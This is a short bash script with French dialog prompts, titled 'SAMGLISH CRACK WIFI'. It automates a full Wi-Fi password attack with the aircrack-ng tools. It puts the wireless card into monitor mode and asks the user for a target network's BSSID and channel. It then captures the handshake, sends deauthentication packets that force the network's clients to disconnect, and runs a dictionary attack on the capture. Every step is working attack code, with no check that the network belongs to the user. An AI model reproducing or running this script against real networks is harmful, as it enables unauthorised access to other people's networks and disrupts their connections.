#!/bin/bash

dialog --msgbox "***SAMGLISH CRACK WIFI***" 10 50
# Vérification de dialog
if ! command -v dialog &> /dev/null; then
    echo "dialog n'est pas installé. Lance : sudo apt install dialog"
    exit 1
fi

# Étape 1 : tuer les interférences et passer en moniteur
airmon-ng check kill
airmon-ng start wlan0

# Étape 2 : scan initial
xterm -hold -e "airodump-ng wlan0mon" &
sleep 3
dialog --msgbox "Observe les réseaux dans la fenêtre ouverte.\nNote le BSSID et le canal.\nFerme la fenêtre puis clique OK." 12 50

# Étape 3 : récupération des infos utilisateur
bssid=$(dialog --inputbox "Entrez le BSSID de la cible :" 8 50 3>&1 1>&2 2>&3)
channel=$(dialog --inputbox "Entrez le canal (CH) de la cible :" 8 50 3>&1 1>&2 2>&3)
output=$(dialog --inputbox "Nom du fichier de capture (ex: capture1) :" 8 50 3>&1 1>&2 2>&3)

# Étape 4 : capture ciblée dans un terminal
xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w $output wlan0mon" &
sleep 3
dialog --msgbox "La capture est lancée dans une nouvelle fenêtre.\nClique OK pour envoyer les paquets de désauth." 10 50

# Étape 5 : attaque de désauth
xterm -e "aireplay-ng -0 10 -a $bssid wlan0mon"

# Étape 6 : arrêt de la capture
pkill airodump-ng
sleep 1

# Étape 7 : sélection du fichier dictionnaire
wordlist=$(dialog --inputbox "Chemin vers votre dictionnaire (ex: /usr/share/wordlists/rockyou.txt) :" 8 60 3>&1 1>&2 2>&3)

# Étape 8 : craquage
capfile="${output}-01.cap"
dialog --msgbox "Début du craquage. Ceci peut prendre du temps." 7 50
xterm -hold -e "aircrack-ng -w $wordlist $capfile"

dialog --msgbox "Fin du script. Vérifie si le mot de passe a été trouvé !" 7 50